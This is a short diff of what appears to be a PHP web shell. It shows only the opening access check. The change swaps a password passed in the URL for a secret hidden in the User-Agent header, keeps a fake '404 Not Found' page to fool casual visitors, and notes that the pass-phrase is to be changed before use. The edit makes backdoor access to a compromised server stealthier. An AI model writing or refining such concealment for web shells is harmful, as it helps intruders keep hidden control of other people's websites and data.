@@ -1,14 +1,11 @@
 <?
-$pwd = "LET_ME_IN";
-
 error_reporting(0);
 
 set_time_limit(0);
 
 $shell = $_SERVER["PHP_SELF"];
 
-if ((isset($_GET["pwd"]) == FALSE) OR
-		(isset($_GET["pwd"]) == TRUE AND $_GET["pwd"] != $pwd))
+if ($_SERVER["HTTP_USER_AGENT"] != md5("LET_ME_IN")) // TODO: change pass-phrase before use
 {
 	exit( sprintf("
 		<h1>404 Not Found</h1>
